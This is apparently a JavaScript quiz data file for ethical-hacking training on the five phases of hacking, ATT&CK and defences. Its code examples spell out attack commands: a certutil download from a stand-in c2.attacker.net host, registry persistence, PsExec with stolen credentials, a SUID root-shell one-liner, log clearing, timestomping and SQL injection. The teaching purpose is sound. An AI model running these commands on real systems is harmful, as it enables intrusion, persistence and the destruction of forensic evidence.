const questions = [
  {
    question: "What are the five standard phases of the CEH / EC-Council hacking methodology in sequential order?",
    shortAnswer: "1. Reconnaissance (Footprinting), 2. Scanning & Enumeration, 3. Gaining Access (Exploitation), 4. Maintaining Access (Persistence), 5. Clearing Tracks (Anti-Forensics).",
    explanation: "The classical ethical hacking methodology follows a structured 5-step lifecycle: 1. Reconnaissance: Gathering intelligence on the target; 2. Scanning: Discovering live hosts, open ports, and services; 3. Gaining Access: Exploiting vulnerabilities to achieve initial compromise; 4. Maintaining Access: Establishing backdoors, rootkits, and persistence; 5. Clearing Tracks: Erasing evidence of the intrusion to evade detection.",
    hint: "Remember the 5 steps: Reconnaissance, Scanning, Gaining Access, Maintaining Access, and Clearing Tracks.",
    level: "basic",
    codeExample: `// The 5 Phases of Hacking Lifecycle:
Phase 1: Reconnaissance  -> WHOIS, DNS enumeration, OSINT, Google Dorking
Phase 2: Scanning        -> Nmap port scan, service banner grabbing, Nessus
Phase 3: Gaining Access  -> Metasploit, SQL injection, buffer overflow, password cracking
Phase 4: Maintaining    -> Backdoors, netcat listener, registry run keys, C2 beacons
Phase 5: Clearing Tracks -> Log wiping, timestomping, deleting dropped binaries`
  },
  {
    question: "What is the crucial operational difference between how a Black Hat Hacker and an Ethical White Hat Hacker handles Phase 5 (Clearing Tracks)?",
    shortAnswer: "A Black Hat maliciously deletes or alters system audit logs and event trails; an Ethical Hacker NEVER deletes client logs, but carefully removes dropped testing tools and documents the cleanup in their report.",
    explanation: "In Phase 5, threat actors attempt anti-forensics by tampering with logs to hinder investigations. An ethical security auditor must NEVER delete or tamper with client audit logs, as doing so destroys compliance trails. Instead, the auditor removes temporary testing accounts and diagnostic tools, restores modified configs to their baseline, and logs all cleanup actions in the final deliverable.",
    hint: "Think about why an ethical tester cleans up their own test tools but never deletes the client's actual audit logs.",
    level: "basic",
    codeExample: `// Phase 5 Ethical Cleanup Mandate:
AUDIT CLEANUP: rm /tmp/security_audit_test.tmp && kill -9 $DIAGNOSTIC_PID (Cleans testing artifacts only, preserves client logs!)`
  },
  {
    question: "What distinguishes 'Passive Reconnaissance' from 'Active Reconnaissance' in Phase 1?",
    shortAnswer: "Passive Recon gathers data from publicly available sources without directly sending packets to target systems; Active Recon directly interacts with target infrastructure (e.g., DNS zone transfers, ping sweeps).",
    explanation: "In Passive Reconnaissance, the hacker queries third-party public data (WHOIS databases, LinkedIn employee rosters, Shodan, Google Dorks, Certificate Transparency logs) without generating a single packet to the target's network, making detection impossible. In Active Reconnaissance, the hacker sends probe packets directly to target servers (DNS zone transfers, port probing, network ping sweeps), which triggers firewall and IDS logging.",
    hint: "Contrast gathering public Google information with sending network probe packets directly to the victim's server.",
    level: "basic",
    codeExample: `// Passive vs Active Reconnaissance:
Passive: curl -s "https://crt.sh/?q=kolkata-fintech.co.in&output=json" (Queries 3rd-party certificate log)
Active:  dig @ns1.kolkata-fintech.co.in kolkata-fintech.co.in AXFR       (Directly queries target DNS server for zone transfer)`
  },
  {
    question: "How does Phase 2 (Scanning) build upon the intelligence gathered during Phase 1 (Reconnaissance)?",
    shortAnswer: "Phase 1 identifies target IP ranges and domain assets; Phase 2 actively probes those IPs to discover live hosts, open TCP/UDP ports, operating system versions, and vulnerable service banners.",
    explanation: "Reconnaissance provides a broad map of the organization's external footprint (e.g. `203.0.113.0/24`). In Phase 2 (Scanning), the tester takes those IP ranges and uses tools like Nmap, Masscan, and Nessus to determine exactly which host machines are online, what TCP/UDP ports are listening (e.g. port 443 HTTPS, port 22 SSH, port 8080 Tomcat), and what exact software versions are running.",
    hint: "Think about moving from finding the building address (Recon) to checking which doors and windows are unlocked (Scanning).",
    level: "basic",
    codeExample: `// Nmap Scanning Phase Execution:
nmap -sV -sC -O -T4 203.0.113.50
// Discovers: Linux 5.15, Apache 2.4.49 (Vulnerable to Path Traversal CVE-2021-41773)`
  },
  {
    question: "How does the Lockheed Martin 'Cyber Kill Chain' expand upon the classic 5 Phases of Hacking?",
    shortAnswer: "The Cyber Kill Chain divides the attack into 7 military-style tactical stages: 1. Reconnaissance, 2. Weaponization, 3. Delivery, 4. Exploitation, 5. Installation, 6. Command and Control (C2), 7. Actions on Objectives.",
    explanation: "Developed in 2011 for military defense, the Cyber Kill Chain decomposes Phase 3 (Gaining Access) into separate stages: Weaponization (coupling exploit with payload into a deliverable file), Delivery (transmitting payload via email/web), Exploitation (triggering code execution), and Installation (placing a persistent backdoor). It models Phase 4 as Command and Control (C2) and Actions on Objectives (data exfiltration/ransomware).",
    hint: "Remember the 7-stage military model: Recon, Weaponize, Deliver, Exploit, Install, C2, Actions on Objectives.",
    level: "moderate",
    codeExample: `// 5 Phases vs Cyber Kill Chain Mapping:
Phase 1 (Recon)            <--> 1. Reconnaissance
Phase 3 (Gaining Access)   <--> 2. Weaponization + 3. Delivery + 4. Exploitation
Phase 4 (Maintaining)      <--> 5. Installation + 6. Command & Control (C2)
Phase 5 (Actions)          <--> 7. Actions on Objectives (Data Theft / Ransomware)`
  },
  {
    question: "What is the MITRE ATT&CK Framework, and why do modern Security Operations Centers (SOCs) prefer it over high-level phase models?",
    shortAnswer: "A globally accessible knowledge base of real-world adversary tactics, techniques, and procedures (TTPs) organized into a detailed matrix of 14 tactical categories and hundreds of granular techniques.",
    explanation: "While the 5-phase model and Kill Chain provide high-level abstractions, MITRE ATT&CK provides granular technical specificity. It categorizes real-world adversary behavior across 14 tactics (Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, C2, Exfiltration, Impact). Each technique (e.g. `T1003.001 LSASS Memory Dump`) contains specific log detection signatures, data sources, and mitigation commands.",
    hint: "Think of MITRE ATT&CK as a comprehensive encyclopedia detailing every single technical trick real-world hackers use.",
    level: "moderate",
    codeExample: `// MITRE ATT&CK Tactic Hierarchy:
TA0001: Initial Access       --> T1566: Phishing
TA0004: Privilege Escalation --> T1068: Exploitation for Privilege Escalation
TA0006: Credential Access    --> T1003: OS Credential Dumping (Mimikatz)
TA0005: Defense Evasion      --> T1070: Indicator Removal (Log Clearing)`
  },
  {
    question: "In Phase 3 (Gaining Access), what are the three primary vectors used to compromise target systems?",
    shortAnswer: "1. Network / Service-level exploits (e.g., unpatched software buffer overflows), 2. Web application vulnerabilities (e.g., SQLi, RCE, IDOR), 3. Client-side social engineering (e.g., spear-phishing payloads).",
    explanation: "Gaining Access is the transition from observer to intruder. Adversaries achieve initial access through: 1. Remote service exploits against exposed network daemons (e.g. EternalBlue SMB, Log4j); 2. Exploiting custom web application business logic flaws (e.g. SQL Injection, Command Injection); or 3. Tricking internal employees into running weaponized documents via spear-phishing emails.",
    hint: "Think about breaking in via unpatched network ports, web application bugs, or tricking employees with phishing.",
    level: "basic",
    codeExample: `// Phase 3 Attack Vectors:
1. Network Exploit: Metasploit exploit/windows/smb/ms17_010_eternalblue -> Root shell
2. Web Exploit:     POST /search?q=' UNION SELECT 1,password FROM users-- -> Admin hash leak
3. Social Vector:   Malicious macro Excel sheet sent to finance officer -> Reverse TCP beacon`
  },
  {
    question: "In Phase 4 (Maintaining Access), why do attackers deploy 'Command and Control' (C2) agents and persistence mechanisms?",
    shortAnswer: "To ensure continued interactive access even if the victim server reboots, the original vulnerability is patched, or the target user logs off.",
    explanation: "Initial exploits are often fragile. If a server reboots or a firewall blocks the incoming port, the attacker loses access. In Phase 4, the attacker installs persistence mechanisms (Windows Registry Run keys, scheduled tasks, cron jobs, kernel rootkits) and connects back to a Command and Control (C2) framework (Cobalt Strike, Sliver, Havoc) via encrypted outbound HTTPS beacons.",
    hint: "Think about installing a hidden spare key and secret door so you can re-enter even if the front window is closed.",
    level: "moderate",
    codeExample: `// Persistence Mechanism (Windows Registry Run Key):
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\\Windows\\Temp\\beacon.exe" /f
// Result: beacon.exe executes automatically every time the user logs in!`
  },
  {
    question: "What is 'Timestomping', and how do threat actors use it in Phase 5 (Clearing Tracks) to confuse forensic investigators?",
    shortAnswer: "Modifying the creation, access, modification, and entry (MACE) timestamps of a malicious file to match legitimate operating system system files.",
    explanation: "When forensic investigators respond to a breach, they analyze timeline artifacts to see which files were created during the incident window (e.g. between 02:00 AM and 04:00 AM). In Phase 5, the attacker uses timestomping tools to change the MACE metadata of their malware binary to match `explorer.exe` (e.g. dating it back to 2018), making the malicious file blend seamlessly into thousands of older system files.",
    hint: "Think about forging the creation date on a forged document to make it look like it was written five years ago.",
    level: "expert",
    codeExample: `// Timestomping via Meterpreter:
timestomp malware.exe -f C:\\Windows\\System32\\kernel32.dll
// Result: malware.exe now displays a 2018 timestamp matching the authentic Windows DLL!`
  },
  {
    question: "What is 'Defense-in-Depth', and how does it map layered defensive controls across all 5 Phases of Hacking?",
    shortAnswer: "Implementing overlapping security controls across multiple layers (network, host, application, data) so that if an attacker succeeds in one phase, controls in the next phase stop the breach.",
    explanation: "No single security tool is 100% effective. Defense-in-Depth ensures layered resistance: 1. Anti-Recon (Domain privacy, public asset minimization); 2. Anti-Scanning (Firewall drop rules, rate limiting); 3. Anti-Exploitation (WAF, IPS, memory ASLR/DEP, MFA); 4. Anti-Persistence (EDR behavioral process monitoring, application whitelisting); 5. Anti-Anti-Forensics (Immutable centralized WORM SIEM logging).",
    hint: "Think of medieval castles with moats, drawbridges, outer walls, inner gates, and a fortified keep.",
    level: "moderate",
    codeExample: `// Defense-in-Depth Layering:
Phase 1 Defense: Cloudflare CDN & RFC 9116 (Minimizes exposed footprint)
Phase 2 Defense: Next-Gen Firewall (Blocks port scans)
Phase 3 Defense: Web Application Firewall & ASLR/DEP (Blocks SQLi & buffer overflows)
Phase 4 Defense: CrowdStrike EDR & Zero Trust (Blocks C2 beacons & privilege escalation)
Phase 5 Defense: Remote Immutable Splunk SIEM (Preserves logs even if local machine is wiped)`
  },
  {
    question: "What is 'Lateral Movement', and why is it a critical transition between Phase 3 (Gaining Access) and Phase 4 (Maintaining Access)?",
    shortAnswer: "The technique adversaries use to systematically extend access from an initial low-privilege compromised workstation across internal subnets to high-value domain controllers and databases.",
    explanation: "Initial entry is rarely achieved on the core target server; attackers usually compromise a marketing laptop via phishing. Lateral movement is the process of using stolen credentials (via Mimikatz LSASS dumps) and administrative protocols (WMI, PsExec, WinRM, SSH) to pivot from computer to computer across the internal network until the attacker reaches the crown-jewel database servers.",
    hint: "Think about jumping from room to room inside a house after climbing through an open basement window.",
    level: "moderate",
    codeExample: `// Lateral Movement via PsExec:
psexec.exe \\\\192.168.1.50 -u DOMAIN\\Admin -p StolenPassword123! cmd.exe
// Result: Spawns interactive remote command shell on the core database server!`
  },
  {
    question: "What is a 'Living-off-the-Land Binary' (LOLBin), and in which hacking phase is it most commonly leveraged to evade antivirus detection?",
    shortAnswer: "Legitimate, pre-installed operating system binaries (e.g. `certutil.exe`, `powershell.exe`, `wmic.exe`) used by attackers in Phases 3 and 4 to execute payloads and establish persistence without writing custom malware to disk.",
    explanation: "Antivirus and EDR tools easily flag unverified executable files (`backdoor.exe`). To bypass this, attackers use LOLBins—trusted binaries pre-installed on Windows or Linux. For example, `certutil.exe -urlcache -f http://c2.net/stage2.dll` uses a Microsoft certificate utility to download malware, bypassing basic perimeter download filters.",
    hint: "Recall using legitimate built-in operating system tools against the computer itself.",
    level: "basic",
    codeExample: `// LOLBin Download & Execution via Certutil:
certutil.exe -urlcache -split -f "https://c2.attacker.net/payload.dll" C:\\Temp\\payload.dll
rundll32.exe C:\\Temp\\payload.dll, Start`
  },
  {
    question: "Why is 'Enumeration' considered the most critical sub-component of Phase 2 (Scanning)?",
    shortAnswer: "Because scanning merely finds open ports, while enumeration extracts exact usernames, machine names, network shares, SNMP strings, and service configurations necessary to launch precise exploits.",
    explanation: "Scanning tells you that port 445 (SMB) is open. Enumeration actively queries port 445 to extract domain user accounts, shared folders, group policies, and password complexity rules (using tools like `enum4linux` or `rpcclient`). Without thorough enumeration, attempting random exploits in Phase 3 is noisy, unreliable, and likely to crash target services.",
    hint: "Think of knowing a door is unlocked (Scanning) versus cataloging the exact names and room keys of everyone inside (Enumeration).",
    level: "moderate",
    codeExample: `// SMB User Enumeration Command:
enum4linux -U 192.168.1.100
// Output: Extracts full list of Active Directory usernames (mamata, debangshu, admin)`
  },
  {
    question: "What is 'Buffer Overflow Exploitation', and how does it allow an attacker to gain control of the CPU Instruction Pointer (EIP/RIP) in Phase 3?",
    shortAnswer: "Writing more data to a memory buffer than it was allocated to hold, overwriting adjacent stack memory and the function return address to redirect CPU execution to injected shellcode.",
    explanation: "In memory-unsafe languages like C/C++, functions allocate stack buffers without bounds checking (e.g. `strcpy()`). If an attacker sends 1,000 bytes into a 100-byte buffer, the extra bytes overwrite the Saved Frame Pointer (EBP) and Return Address (EIP). By setting EIP to point to their injected shellcode in RAM, the CPU executes the attacker's arbitrary machine instructions.",
    hint: "Think about pouring two liters of water into a one-liter jug until the overflow spills into the computer's steering wheel.",
    level: "expert",
    codeExample: `// Vulnerable C Code:
void vulnerableFunction(char *input) {
    char buffer[64];
    strcpy(buffer, input); // UNSAFE: No length boundary check!
}
// Exploit Payload: [ 64 bytes 'A' ] + [ 4 bytes EBP ] + [ 4 bytes Address_of_Shellcode ] + [ Shellcode ]`
  },
  {
    question: "What is 'Anti-Forensics', and what are three common techniques used by black-hat adversaries in Phase 5?",
    shortAnswer: "1. Clearing/tampering event logs, 2. Secure file shredding/wiping (overwriting memory blocks), 3. Timestomping file metadata.",
    explanation: "Anti-forensics comprises all techniques designed to frustrate or defeat digital forensic investigations: 1. Log Manipulation: Erasing or editing auth/security event logs; 2. Secure Deletion: Overwriting deleted malware files with zeroes or random bytes using `srm` or `sdelete` so file recovery tools cannot reconstruct binaries; 3. Timestomping: Altering file creation timestamps to blend with original OS files.",
    hint: "Think of wiping fingerprints, shredding documents, and changing dates on clocks after committing a crime.",
    level: "moderate",
    codeExample: `// Anti-Forensics Techniques:
1. Log Deletion:     wevtutil cl Security
2. Secure Shred:     sdelete.exe -p 3 -z C:\\Temp\\exploit.exe (3-pass cryptographic wipe)
3. Timestomping:     Set-ItemProperty -Path payload.exe -Name LastWriteTime -Value "01/01/2019"`
  },
  {
    question: "Under the Indian IT Act 2000, how does Section 66 specifically penalize actions conducted across Phases 2, 3, and 5?",
    shortAnswer: "It criminalizes unauthorized access, downloading, damage, virus introduction, and data alteration with up to 3 years imprisonment and ₹5 Lakhs fine.",
    explanation: "The IT Act 2000 covers the entire hacking methodology: Port scanning and unauthorized probing without permission violate Section 43/66; Exploitation and payload execution violate Section 66 (Hacking); Log tampering and source code alteration violate Section 65 and Section 66. It carries up to 3 years imprisonment and ₹5,00,000 in fines.",
    hint: "Remember the primary Indian cyber law statute that punishes hacking and unauthorized access with 3 years in prison.",
    level: "basic",
    codeExample: `// IT Act 2000 Applicability across Hacking Phases:
Phase 2 (Probing / Scanning)     -> Section 43(a) Unauthorized Access
Phase 3 (Exploitation / Breach)  -> Section 66 Hacking (Cognizable, 3 Years Prison + ₹5L Fine)
Phase 5 (Log Tampering / Wipe)   -> Section 65 / 66 Tampering & System Damage`
  },
  {
    question: "What is 'Privilege Escalation' (Vertical vs Horizontal), and why is it essential in Phase 4?",
    shortAnswer: "Vertical escalation elevates access from a standard user to Administrator/Root; Horizontal escalation accesses resources belonging to another user at the same privilege level.",
    explanation: "When an initial exploit lands, it usually executes under a low-privilege service account (e.g. `www-data` or `IIS_IUSRS`). The attacker cannot install drivers, dump passwords, or modify system files. In Phase 4, the attacker performs Vertical Privilege Escalation (exploiting kernel bugs, SUID binaries, or unquoted service paths) to jump from `www-data` to `root` or `NT AUTHORITY\\SYSTEM`.",
    hint: "Compare jumping from an ordinary user to the Super Admin (Vertical) versus accessing another student's account (Horizontal).",
    level: "basic",
    codeExample: `// Linux SUID Privilege Escalation (Vertical):
find / -perm -4000 2>/dev/null
// Discovers /usr/bin/find with SUID root bit set!
/usr/bin/find . -exec /bin/sh -p \\; -quit
// Result: Instant root shell (#)!`
  },
  {
    question: "How do 'Automated Breach and Attack Simulation' (BAS) platforms validate enterprise defenses across the 5 Phases continuously?",
    shortAnswer: "By running safe, scripted, atomic attack simulations mapped to MITRE ATT&CK techniques across production networks 24/7 to test SIEM/EDR alert readiness without disrupting operations.",
    explanation: "Traditional penetration tests occur once a year. Breach and Attack Simulation (BAS) tools (e.g. AttackIQ, XM Cyber, Cymulate) run safe, non-destructive automated scripts 24/7. They simulate Reconnaissance, Scanning, Lateral Movement, and Persistence continuously, validating whether the enterprise SOC and EDR agents actually detect each technique.",
    hint: "Think of an automated robotic training dummy constantly testing your security alarms 24 hours a day.",
    level: "expert",
    codeExample: `// BAS Automated Atomic Test Simulation:
[ Test 1 ]: Execute LSASS memory dump test -> Verifies Sysmon Event ID 10 alerts in Splunk.
[ Test 2 ]: Execute Registry Run key persistence test -> Verifies CrowdStrike EDR triggers IOA.
[ Test 3 ]: Execute DNS tunneling C2 test -> Verifies Next-Gen Firewall blocks link.`
  },
  {
    question: "What is 'Centralized Immutable SIEM Logging', and how does it defeat adversary Phase 5 Anti-Forensics attempts?",
    shortAnswer: "Streaming system logs in real-time to an external, write-once read-many (WORM) SIEM server that local host administrators cannot edit or delete.",
    explanation: "When a black hat compromises a Windows or Linux server, they obtain root privileges and can easily delete local log files (`rm /var/log/auth.log`). In modern enterprise architectures, Sysmon, syslog, and auditd stream events over TLS to a centralized Splunk or Elastic SIEM within milliseconds. Even if the attacker completely formats the local machine, the complete chronological record of their intrusion is safely stored on the immutable SIEM server.",
    hint: "Think about security cameras streaming live video to a secure off-site cloud bank vault that the burglar cannot touch.",
    level: "expert",
    codeExample: `// Centralized Real-time Syslog Streaming:
Workstation (192.168.1.50) -> [ TLS Encrypted Syslog Stream ] -> Splunk SIEM Server (10.0.0.99)
// Attacker on workstation runs: "wevtutil cl Security"
// Splunk records: Event ID 1102 ("The audit log was cleared by User Admin") -> Instant SOC Critical Alert!`
  },
  {
    question: "Synthesizing the entire 5 Phases of Hacking methodology: what is the single most important lesson for an ethical security professional?",
    shortAnswer: "A structured understanding of the attacker's methodology allows ethical defenders to anticipate threats, eliminate vulnerabilities early in the kill chain, and build unbreakable defense-in-depth architectures.",
    explanation: "Ethical hacking is not about random chaos; it is a systematic, rigorous engineering discipline. By mastering each phase—from passive OSINT reconnaissance and port scanning to exploitation, persistence, and anti-forensics—the ethical professional sees systems through the eyes of the adversary. This structured foresight enables defenders to disrupt attack chains at the earliest possible phase, safeguarding human welfare and national infrastructure.",
    hint: "Conclude by recognizing that understanding the adversary's full lifecycle is the ultimate foundation of effective defense.",
    level: "expert",
    codeExample: `// The Ethical Defense Paradigm:
Understand_The_Phases() -> Break_The_Kill_Chain_Early() -> Guarantee_Resilience();`
  }
];

export default questions;
